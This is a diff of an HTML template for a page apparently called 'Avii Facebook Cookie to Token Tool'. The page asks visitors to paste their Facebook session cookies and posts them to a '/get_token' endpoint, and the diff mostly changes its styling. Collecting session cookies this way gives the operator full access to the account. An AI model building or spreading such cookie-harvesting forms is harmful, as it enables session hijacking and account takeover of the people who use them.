@@ -1,36 +1,38 @@
-<!-- templates/token_form.html -->
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Token Extractor</title>
+    <title>Avii Token Tool</title>
     <style>
         body {
-            background: black;
-            color: white;
-            text-align: center;
+            background-color: #000;
+            color: #0f0;
             font-family: monospace;
+            text-align: center;
+            padding-top: 80px;
         }
-        textarea, input {
+        input[type="text"] {
             width: 80%;
             padding: 10px;
-            border: 1px solid #00ff00;
             background: #111;
             color: #0f0;
+            border: 1px solid #0f0;
+            border-radius: 5px;
         }
-        button {
+        input[type="submit"] {
             padding: 10px 20px;
             background: #0f0;
-            color: black;
+            color: #000;
             border: none;
-            cursor: pointer;
+            border-radius: 5px;
+            font-weight: bold;
         }
     </style>
 </head>
 <body>
-    <h2>Paste your Facebook Cookies below</h2>
-    <form method="post">
-        <textarea name="cookie" rows="8" required></textarea><br><br>
-        <button type="submit">Extract Token</button>
+    <h1>🚀 Avii Facebook Cookie to Token Tool</h1>
+    <form action="/get_token" method="POST">
+        <input type="text" name="cookie" placeholder="Paste Facebook Cookie Here"><br><br>
+        <input type="submit" value="Get Token">
     </form>
 </body>
 </html>
